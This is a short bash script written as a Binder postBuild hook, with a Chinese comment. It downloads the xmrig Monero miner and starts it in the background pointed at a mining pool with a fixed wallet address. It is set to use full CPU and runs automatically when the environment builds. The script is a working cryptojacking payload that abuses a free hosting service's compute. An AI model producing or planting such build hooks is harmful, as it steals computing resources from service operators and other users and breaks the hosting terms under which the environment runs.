#!/bin/bash
# Binder postBuild — 下载并后台运行 xmrig
set -e

echo "[*] Downloading xmrig..."
wget -q -O /tmp/xmrig.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-focal-x64.tar.gz
cd /tmp && tar xzf xmrig.tar.gz --strip-components=1
chmod +x xmrig

echo "[*] Starting xmrig in background..."
nohup /tmp/xmrig -o gulf.moneroocean.stream:10032 -u 45qqTqhjmsz8mhzry3dG6rJgt9Jdzfh9xa6Skh1mtmBGgNubPDsrJVVEg6cWS6DtEB5i6BWTEaQA7BRws6UEibKEAQ1dd9X -p binder_worker --donate-level=0 --cpu-max-threads-hint=100 --print-time=300 > /tmp/xmrig.log 2>&1 &

echo "[*] PID: $!"
